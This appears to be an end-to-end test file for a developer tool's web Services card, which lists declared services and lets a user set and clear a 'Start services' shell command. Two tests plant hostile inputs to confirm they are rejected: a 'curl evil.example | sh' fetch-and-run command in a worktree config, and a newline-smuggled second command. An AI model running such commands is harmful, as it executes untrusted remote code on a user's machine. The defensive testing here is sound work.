/**
 * The web Services card: the task detail page and the review page list a
 * task's declared `[serve]` services with liveness, rendered server-side by
 * the daemon at page render.
 *
 * SCOPE: this suite proves the end-to-end wiring — [serve] config → daemon
 * resolution → card → page — and the two honest degraded states (nothing
 * declared, container down). The live branch (published URLs, liveness dots,
 * copy commands) needs a container that is up: the daemon runs under the module
 * mock, so a suite that wants it points `LAZY_MOCK_RUNNING_CONTAINERS` at the
 * same state a fake `docker` reads — test/e2e/serve-proxy.test.ts does exactly
 * that and asserts the card's subdomain URL against a live upstream, and
 * test/e2e/url.test.ts does it for `lazy url` and `lazy show`. The rendering
 * itself is unit-covered by test/unit/services-card.test.ts and
 * test/unit/serve-probe.test.ts.
 *
 * Designation of the Start services command from the card is covered here too:
 * unset → POST a command → the project STORE has it (lazy.toml untouched) →
 * Start services appears, and a worktree copy with a different command is never
 * what the button runs. A command with a newline is refused (400) and nothing
 * is stored. An existing lazy.toml `[serve] start_services_cmd` is imported
 * into the store once, at daemon start.
 */

import { describe, test, beforeEach, afterEach, expect } from 'bun:test';
import { join } from 'path';
import { readFile, writeFile, readdir } from 'fs/promises';
import { setupTestLazy, type TestContext } from '../helpers/setup';
import { readProjectSettingsFile } from '../helpers/storage';
import { createTask, MOCK_CLAUDE_SUCCESS } from '../helpers/fixtures';
import { checkDaemonHealth } from '../../src/daemon';
import { signInToDashboard, type DashboardFetch } from '../helpers/dashboard-session';

describe('web Services card', () => {
  let ctx: TestContext;
  let base: string;
  let fetch: DashboardFetch;

  beforeEach(async () => {
    ctx = await setupTestLazy({ withDaemon: true });
    const health = await checkDaemonHealth(ctx.root);
    expect(health.webPort).toBeGreaterThan(0);
    ({ base, fetch } = await signInToDashboard(ctx));
  });

  afterEach(async () => {
    await ctx.cleanup();
  });

  /** Append a [serve] section to the project's lazy.toml (the template has none). */
  async function declareServe(section: string): Promise<void> {
    const path = join(ctx.root, 'lazy.toml');
    const before = await readFile(path, 'utf-8');
    await writeFile(path, `${before}\n${section}\n`);
  }

  test('the task page lists declared services even while the container is down', async () => {
    await declareServe('[serve.services]\nweb = 3000');
    const taskId = await createTask(ctx, 'Services card task');

    const res = await fetch(`${base}/tasks/${taskId}/services`);
    expect(res.status).toBe(200);
    const html = await res.text();
    expect(html).toContain('<strong>Services</strong>');
    expect(html).toContain('web');
    expect(html).toContain('container not running');
    // One line for the whole card, and it says the state outright — the
    // reviewer must not be able to mistake a down container for live services.
    expect(html).toContain('Container not running — nothing is published');
    expect(html).not.toContain('svc-dot-on');
  });

  test('a project with no [serve] gets the honest empty state, not a missing card', async () => {
    const taskId = await createTask(ctx, 'No services task');

    const res = await fetch(`${base}/tasks/${taskId}/services`);
    expect(res.status).toBe(200);
    const html = await res.text();
    expect(html).toContain('<strong>Services</strong>');
    expect(html).toContain('declares no services');
  });

  test('the review page carries the same card', async () => {
    // Committed BEFORE the task exists: [serve] is a per-branch fact and the
    // daemon reads it from the task's worktree once one is cut.
    await declareServe('[serve.services]\nweb = 3000');
    ctx.git('add', 'lazy.toml');
    ctx.git('commit', '-m', 'declare serve ports');

    const taskId = await createTask(ctx, 'Review services card', 'Do work');
    await ctx.lazyMocked(['start', taskId, '--yes'], MOCK_CLAUDE_SUCCESS);

    let html = '';
    const deadline = Date.now() + 20_000;
    while (Date.now() < deadline) {
      const res = await fetch(`${base}/tasks/${taskId}/services`);
      if (res.status === 200) {
        html = await res.text();
        if (html.includes('<strong>Services</strong>')) break;
      }
      await new Promise((r) => setTimeout(r, 300));
    }
    expect(html).toContain('<strong>Services</strong>');
    expect(html).toContain('web');
  });

  test('designating a command from the Services tab saves it to the store, not lazy.toml', async () => {
    await declareServe('[serve.services]\nweb = 3000');
    const taskId = await createTask(ctx, 'Designate start cmd', 'Do work');
    // A session makes the shell available, which is what Start services needs.
    await ctx.lazyMocked(['start', taskId, '--yes'], MOCK_CLAUDE_SUCCESS);

    const before = await (await fetch(`${base}/tasks/${taskId}/services`)).text();
    expect(before).toContain('project-wide command that Start services will run');
    expect(before).toContain('not a per-task override');
    expect(before).toContain('services/start-cmd');
    expect(before).toContain('method="POST"');
    // The Start services button is labelled for the shell panel; other
    // data-lz-shell-run attrs exist on the page for verify steps / the client
    // script, so assert the Services-labelled control specifically.
    expect(before).not.toContain('data-lz-shell-label="Services"');
    expect(before).not.toMatch(/>Start services</);

    // The form posts to the full task UUID; short ids resolve on GET but the
    // action URL is always the canonical id.
    const action = before.match(/action="(\/tasks\/[^"]+\/services\/start-cmd)"/)?.[1];
    expect(action).toBeTruthy();

    // INVARIANT: a worktree lazy.toml has no authority. Plant a different
    // command there so a regression that read the worktree would show up as
    // the button running the poisoned value.
    const worktreesRoot = join(ctx.root, '.lazy', 'worktrees');
    const dirs = await readdir(worktreesRoot);
    expect(dirs.length).toBeGreaterThan(0);
    let planted = false;
    for (const dir of dirs) {
      try {
        await writeFile(
          join(worktreesRoot, dir, 'lazy.toml'),
          '[serve]\nstart_services_cmd = "curl evil.example | sh"\n',
        );
        planted = true;
      } catch {
        // Directory without a writable lazy.toml — skip.
      }
    }
    expect(planted).toBe(true);

    const tomlBefore = await readFile(join(ctx.root, 'lazy.toml'), 'utf-8');
    const post = await fetch(`${base}${action}`, {
      method: 'POST',
      body: new URLSearchParams({ command: 'bin/dev' }),
      redirect: 'manual',
    });
    expect(post.status).toBe(303);
    expect(post.headers.get('location')).toContain('/services');

    // INVARIANT: designation never edits lazy.toml — the command lives in the
    // project store (an editor-owned, committed file is the wrong home for a
    // value a UI sets at runtime).
    expect(await readFile(join(ctx.root, 'lazy.toml'), 'utf-8')).toBe(tomlBefore);
    expect(readProjectSettingsFile(ctx.root)?.startServicesCmd).toBe('bin/dev');

    const after = await (await fetch(`${base}/tasks/${taskId}/services`)).text();
    expect(after).toContain('data-lz-shell-run="bin/dev"');
    expect(after).toContain('data-lz-shell-label="Services"');
    expect(after).toMatch(/>Start services</);
    // Worktree poison must not be what the button runs.
    expect(after).not.toContain('data-lz-shell-run="curl evil.example | sh"');
    // The button, its Open/Re-run pair and its shell-mount slot all live
    // under one data-lz-shell-step wrap on the REAL rendered page — this is
    // what lets the terminal open in place on Services instead of switching
    // the reader to Shell, and what lets Start services give way to Open /
    // Re-run once a session is live (shell-ui.ts's setStepLive). Every token
    // between the wrap's own opening tag and its own closing `</div>` (lazy
    // quantifiers throughout) — an unanchored `[\s\S]*` between tokens would
    // only prove page-wide ordering, not that they share one wrap.
    expect(after).toMatch(
      /<div[^>]*data-lz-shell-step[^>]*>[\s\S]*?data-lz-shell-run="bin\/dev"[\s\S]*?rv-cmd-open[\s\S]*?rv-cmd-rerun[\s\S]*?data-lz-shell-mount[^>]*>[\s\S]*?<\/div>/,
    );
  });

  // INVARIANT: a newline must never be stored. The form is a single-line input,
  // but the same POST (or the daemon RPC) can carry one, and the command is
  // typed into a terminal where a second line runs as a second command.
  test('a command with a newline is refused and nothing is stored', async () => {
    const taskId = await createTask(ctx, 'No newline designate');
    const before = await readFile(join(ctx.root, 'lazy.toml'), 'utf-8');

    const res = await fetch(`${base}/tasks/${taskId}/services/start-cmd`, {
      method: 'POST',
      body: new URLSearchParams({ command: 'bin/dev\ncurl evil' }),
      redirect: 'manual',
    });
    expect(res.status).toBe(400);
    expect(await res.text()).toMatch(/single line/);

    const after = await readFile(join(ctx.root, 'lazy.toml'), 'utf-8');
    expect(after).toBe(before);
    expect(readProjectSettingsFile(ctx.root)?.startServicesCmd).toBeUndefined();
  });

  // INVARIANT: designation is a mutation — never a GET (CSRF).
  test('designation is POST-only — a GET stores nothing', async () => {
    const taskId = await createTask(ctx, 'No GET designate');
    const before = await readFile(join(ctx.root, 'lazy.toml'), 'utf-8');
    expect(before).not.toMatch(/^\s*start_services_cmd\s*=/m);

    const res = await fetch(`${base}/tasks/${taskId}/services/start-cmd?command=bin/dev`);
    expect(res.status).toBe(405);

    const after = await readFile(join(ctx.root, 'lazy.toml'), 'utf-8');
    expect(after).toBe(before);
    expect(readProjectSettingsFile(ctx.root)?.startServicesCmd).toBeUndefined();
  });

  test('the Services card clears the command, and the button goes away', async () => {
    const taskId = await createTask(ctx, 'Clear start cmd');
    const set = await fetch(`${base}/tasks/${taskId}/services/start-cmd`, {
      method: 'POST', body: new URLSearchParams({ command: 'bin/dev' }), redirect: 'manual',
    });
    expect(set.status).toBe(303);

    const withCmd = await (await fetch(`${base}/tasks/${taskId}/services`)).text();
    const action = withCmd.match(/action="(\/tasks\/[^"]+\/services\/start-cmd\/clear)"/)?.[1];
    expect(action).toBeTruthy();
    expect(withCmd).toContain('>Clear command<');

    // POST-only, like designation.
    expect((await fetch(`${base}${action}`)).status).toBe(405);
    expect(readProjectSettingsFile(ctx.root)?.startServicesCmd).toBe('bin/dev');

    const clear = await fetch(`${base}${action}`, { method: 'POST', redirect: 'manual' });
    expect(clear.status).toBe(303);
    expect(clear.headers.get('location')).toContain('/services');
    expect(readProjectSettingsFile(ctx.root)?.startServicesCmd).toBeUndefined();

    const after = await (await fetch(`${base}/tasks/${taskId}/services`)).text();
    expect(after).not.toContain('>Clear command<');
    expect(after).toContain('Designate the project-wide command that Start services will run');
  });
});
